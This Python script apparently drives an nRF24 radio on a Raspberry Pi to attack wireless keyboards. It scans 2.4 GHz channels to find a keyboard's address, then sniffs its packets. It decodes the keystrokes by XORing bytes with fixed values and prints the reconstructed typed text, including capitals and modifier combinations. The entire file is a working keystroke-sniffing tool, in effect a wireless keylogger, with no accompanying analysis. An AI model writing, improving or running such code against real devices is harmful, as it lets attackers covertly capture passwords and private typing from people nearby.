import string

import nrf24
import pigpio
import time

import hid_codes
from configurator import NRFConfigurator
from limited_array import LimitedArray
from nrf_wrapper import NRF24Wrapper

ipAddress = "localhost"  # ip of raspberrypi
port = "8888"  # port of pi

pi = pigpio.pi(ipAddress, port)
if not pi.connected:
    print("Not connected to Raspberry Pi ... goodbye.")
    exit()


def find_keyboard_channel(nrf: NRF24Wrapper):
    common_channels = [5, 9, 21, 25, 29, 31, 44, 52, 54, 56, 72, 76]

    while True:
        for chan in common_channels:  # from 2.403 to 2.481
            nrf.set_channel(chan)
            probed_time = time.time()
            while time.time() - probed_time < 1:
                payload = nrf.get_payload()

                if payload[4] != 0xcd:
                    continue

                print(chan, ':'.join(f'{i:02x}' for i in payload))

                if (payload[6] & 0x7F) << 1 != 0x0A:
                    continue

                if payload[7] << 1 != 0x38 and payload[7] << 1 != 0x78:
                    continue

                mac = ':'.join(f'{i:02x}' for i in payload[0:5][::-1])

                return mac, chan

        common_channels = range(3, 81)


def is_key_event_packet(payload: list[int]) -> bool:
    return payload[0] == 0xa and payload[1] == 0x78 and len(payload) > 8


# def xor_strings(s1, s2):
#     return "{:02x}".format(int(s1, 16) ^ int(s2, 16))


# def get_letter(hid_key: int):
#     return string.ascii_lowercase[hid_key - 4]


def sniff_channel(nrf: NRF24Wrapper, mac: str, chan: int):
    nrf.close_reading_pipe(nrf24.RF24_RX_ADDR.P0)
    buffer = LimitedArray(1024)

    sequence_id_log = LimitedArray(8)
    last_key = None
    key_state = {}

    def gpio_interrupt(gpio, level, tick):
        nonlocal last_key
        nonlocal key_state

        while nrf.data_ready():
            payload = nrf.get_payload()

            if not is_key_event_packet(payload):
                # print("not key event packet")
                continue

            sequence_id = payload[4:6]

            sequence_number = int(
                "".join(f"{i:02x}" for i in sequence_id[::-1]),
                base=16
            )

            if sequence_number in sequence_id_log:
                # print("skipping duplicate sequence_id", sequence_id)
                continue

            # in final replace 0xCD with first MAC byte
            hid_key = payload[9] ^ 0xCD

            key = f'0x{hid_key:02x}'

            # in final replace 0x52 with MAC value
            hid_knyfel = payload[7] ^ 0x52

            knyfel = f'0x{hid_knyfel:02x}'

            # key_state[hid_key] = sequence_number

            # if hid_key == 0:
            #     key_state = {}
            # print(key_state)

            # if last_key == hid_key:
            # continue

            if hid_key != 0 and f"{payload[10]:x}" == mac[3:5]:
                last_key = hid_key

                if hid_key == 0x2c:
                    buffer.append(' ')
                elif hid_key >= 0x04 and hid_key <= 0x1d:
                    if hid_knyfel == 0x20 or hid_knyfel == 0x02:
                        buffer.append(string.ascii_uppercase[last_key - 4])
                    elif hid_knyfel != 0x00:
                        buffer.append(f"<{hid_codes.USB_HID_MODIFIERS_HUMAN[knyfel]} + {string.ascii_lowercase[last_key - 4]}>")
                    else:
                        if sequence_id_log.get_last_item() - sequence_number != 1:
                            buffer.append(string.ascii_lowercase[last_key - 4])
                elif hid_key >= 0x1e and hid_key <= 0x27:
                    buffer.append(string.digits[(last_key - 29) % 10])
                else:
                    buffer.append(f"<{hid_codes.USB_HID_KEYS_HUMAN[key]}>")

                # print(
                #     sequence_number,
                #     f'Channel: {chan} | Packet: '
                #     f'{":".join(hex(x) for x in payload)} | '
                #     f"HID_KEY: "
                #     f"{hid_key} | Key: "
                #     f"{hid_codes.USB_HID_KEYS_HUMAN[key]}"
                # )

                sequence_id_log.append(sequence_number)

                # print(payload)
                print("".join(buffer))

    nrf = NRFConfigurator.configure_for_sniffing(pi, mac, chan, gpio_interrupt)

    while True:
        time.sleep(1)


def crack_mac():
    nrf = NRFConfigurator.configure_for_mac_cracking(pi)
    mac, chan = find_keyboard_channel(nrf)
    print("KEYBOARD FOUND!", chan, mac)
    sniff_channel(nrf, mac, chan)


if __name__ == "__main__":
    crack_mac()
